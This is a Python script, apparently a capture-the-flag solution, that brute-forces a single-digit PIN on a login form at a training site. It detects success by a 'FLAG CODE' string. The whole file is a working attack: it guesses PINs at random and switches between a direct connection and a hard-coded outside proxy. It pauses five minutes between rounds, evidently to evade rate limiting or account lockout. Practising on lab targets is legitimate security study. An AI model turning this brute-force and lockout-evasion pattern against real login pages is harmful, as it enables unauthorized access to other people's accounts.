import requests
import time
import os
import random
from bs4 import BeautifulSoup

time_count = 0
def timer(time_count, new_time=0):
    if (new_time):
        time_count = new_time

    if (time_count <= 0):
        return
    else:
        print('time left: {}'.format(time_count), end='\r')
        time_count -= 1
        time.sleep(1)
        timer(time_count)

api_key = 'ENTER KEY HERE'
url = 'http://102.cybertrial.co.uk/login'

proxies = {'http': 'http://51.79.31.188:8080'} 

r = requests.session()
r.get(url + '?mykey=' + api_key)
proxy_active = False

pins = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
tried = []
for e in tried:
    pins.remove(tried)
for pin in range(11):
    # choose a random number from pins, then remove it from the list
    if (len(pins) == 1):
        print('pin found: {}'.format(pins[0]))
        for i in range(5):
            os.system('beep')
        exit(0)
    pin = random.choice(pins)
    pins.remove(pin)

    print('trying: {}'.format(pin))
    if proxy_active:
        resp = r.post(url, {'formgo':1, 'pin':pin,}, proxies=proxies)
    else:
        resp = r.post(url, {'formgo':1, 'pin':pin})
    
    if ('FLAG CODE' in resp.text):
        print('pin found: {}'.format(pin))
        for i in range(5):
            os.system('beep')
        exit(0)
    else:
        print('incorrect pin')
        
        f = open('tmp/{}'.format(pin), 'w')
        f.write(resp.text)
        f.close()
        os.system('beep')

        if not proxy_active:
            #print('activating proxy')
            proxy_active = True
        else:
            #print('stopping proxy')
            proxy_active = False
            #print('sleeping for 300 seconds')
            time_count = 0
            timer(time_count, 300)
